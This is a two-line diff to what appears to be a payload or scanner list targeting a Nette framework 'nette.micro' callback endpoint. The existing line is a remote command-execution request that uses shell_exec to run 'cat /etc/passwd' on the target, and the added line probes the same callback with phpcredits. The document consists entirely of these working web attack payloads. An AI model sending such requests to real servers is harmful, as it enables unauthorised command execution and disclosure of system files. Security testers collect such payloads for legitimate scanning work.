@@ -1,1 +1,2 @@
 /nette.micro/?callback=shell_exec&cmd=cat%20/etc/passwd&what=-1
+/nette.micro/?callback=phpcredits
